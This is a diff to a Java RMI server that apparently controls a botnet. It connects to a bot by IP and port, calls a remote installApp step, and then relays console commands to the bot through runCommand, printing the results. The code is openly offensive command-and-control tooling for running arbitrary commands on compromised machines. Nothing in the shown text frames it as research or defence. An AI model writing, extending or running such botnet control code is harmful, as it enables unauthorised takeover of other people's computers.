@@ -36,16 +36,20 @@ public class RMIServer {
             System.out.println(">>>>>INFO: Socket Server started!!!!!!!!");
             
             IBotnet botnet = null;
-            while (true){
-                Scanner scanner = new Scanner(System.in);
-                System.out.println("Bot IP: ");
-                String ip = scanner.nextLine();
-                System.out.println("Port: ");
-                String port = scanner.nextLine();
-                botnet = (IBotnet) Naming.lookup("rmi://" + ip + ":" + port + "/BotnetRMI");
-                botnet.testing();
+            Scanner scanner = new Scanner(System.in);
+            System.out.println("Bot IP: ");
+            String ip = scanner.nextLine();
+            System.out.println("Port: ");
+            String port = scanner.nextLine();
+            botnet = (IBotnet) Naming.lookup("rmi://" + ip + ":" + port + "/BotnetRMI");
+            botnet.testing();
             
+            System.out.println(">>>>>Install app/tools!!!!!!!!");
+            botnet.installApp();
+            
+            while (true){
                 String cmd = scanner.nextLine();
+                System.out.println("New command: " + cmd);
                 if(cmd != null){
                     ArrayList<String> arr = botnet.runCommand(cmd);
                     for(String i:arr){
@@ -54,18 +58,6 @@ public class RMIServer {
                 }
             }
             
-//            IBotnet botnet = (IBotnet) Naming.lookup("rmi://127.0.0.1:1234/BotnetRMI");
-            
-//            while(true){
-//                Scanner scanner= new Scanner(System.in);
-//                String cmd = scanner.nextLine();
-//                
-//                ArrayList<String> arr = botnet.runCommand(cmd);
-//                
-//                for(String i:arr){
-//                    System.out.println(i);
-//                }
-//            }
         } catch (RemoteException ex) {
             Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
         } catch (NotBoundException ex) {
